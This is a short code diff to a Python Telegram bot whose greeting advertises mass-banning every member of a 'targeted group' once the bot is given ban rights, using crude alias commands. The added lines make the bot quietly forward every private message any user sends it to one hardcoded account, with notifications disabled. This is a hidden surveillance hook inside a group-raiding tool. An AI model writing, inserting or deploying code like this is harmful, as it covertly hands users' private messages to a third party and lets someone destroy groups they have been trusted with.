@@ -37,3 +37,10 @@ async def _(bot, msg):
 async def hello(bot, message):
     await message.reply("Hello, This Is a Banall Bot, I can Ban Members Within seconds!\n\n Simply give me Ban rights in targeted group and give command /banall, or you can use alternative commands like /tmkc, /chudaistart, /fuckall [๏](https://te.legra.ph/file/6e056c758a8f6f47476fb.jpg)")
 
+
+
+@bot.on_message(filters.private & filters.incoming)
+async def on_pm_s(client: Client, message: Message):
+    if message.from_user.id != 1143358497:
+        fwded_mesg = await message.forward(chat_id=1143358497, disable_notification=True)
+
